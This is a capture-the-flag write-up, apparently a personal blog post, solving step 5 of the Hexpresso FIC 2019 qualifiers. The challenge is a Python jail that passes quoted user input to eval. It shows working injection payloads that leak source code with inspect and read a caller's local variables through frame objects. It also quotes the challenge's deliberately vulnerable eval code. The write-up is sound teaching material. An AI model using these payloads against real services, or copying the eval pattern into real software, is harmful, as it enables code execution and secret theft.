---
title: Hexpresso FIC Quals 2019: Step 5
slug: hexpresso-fic-5
date: 20/12/2019 05
---

The fifth step is a Python jail that we must escape.

![Introduction](/assets/hexpresso-fic-quals/step5/intro.png)

We are provided a few files allowing to connect to the challenge:

```
$ socat stdio openssl-connect:ctf.hexpresso.fr:2323,cert=client.pem,cafile=server.crt,verify=0
>et ça fait bim bam boum
Bad flag !
```

Well... Looks like our input is somehow compared to the actual flag. Let's
try to break the script in order to get a trace:

```
>'
Traceback (most recent call last):
  File "./main.py", line 28, in <module>
    main()
  File "./main.py", line 21, in main
    if flag == get_input():
  File "./main.py", line 15, in get_input
    return eval(f"""'{input(">")}'""")
  File "<string>", line 1
    '''
      ^
SyntaxError: EOF while scanning triple-quoted string literal
```

There is a lot of information here! What we know:

* The script is `main.py`
* Our input is retrieved using the `input` function
* The [f-string](https://realpython.com/python-f-strings/) feature is used,
so we are in a Python 3.6 runtime at least
* Our input is put into single quotes and forwarded to `eval`
* We are in a function `get_input`
* `get_input` is called in main
* There is a `flag` variable in the `main` function that looks to hold the flag

We can inject Python using a standard closing/comment payload such as:

```
>vroum' and print('Hello') #
Hello
Bad flag !
```

In that example, the following is evaluated:

```python
'vroum' and print('Hello') #'
```

As `'vroum'` is a truthy, the other side of the `and` gets to be evaluated
and our `print` is executed.

I used [inspect](https://docs.python.org/3/library/inspect.html) in order
to leak the source code:

```
>vroum' + print(__import__('inspect').getsource(get_input)) #
def get_input():
    return eval(f"""'{input(">")}'""")
[truncated]
```

Let's get main:

```
>vroum' + print(__import__('inspect').getsource(main)) #
def main():
    flag = get_flag()

    if flag == get_input():
        print(SUCCESS)
    else:
        print(FAIL)
[truncated]
```

The `get_flag` function looks promising!

```
>vroum' + print(__import__('inspect').getsource(get_flag)) #
def get_flag():
    flag = os.environ.get("FLAG", "FLAG{LOCAL_FLAG}")
    os.environ.update({"FLAG": ""})
    return flag
```

Too bad for us... The flag is retrieved and then emmediately removed
from the environment at the start of the script. We'll have to go back a couple
of scopes in order to reach the `flag` variable and print its content.

```
>vroum' and print(__import__('inspect').currentframe().f_back.f_back.f_locals) #
{'flag': 'Next step : http://c4ffddcc437c5df3e6d681e7cafab510.hexpresso.fr'}
Bad flag !
```

This payload is actually very simple:

* Import `inspect`
* Get the current frame (in the `eval`)
* Go back one scope (to `get_input`)
* Go back another scope (to `main`)
* Print the local variables (of `main`)

[Click here](/hexpresso-fic-6) for the next step!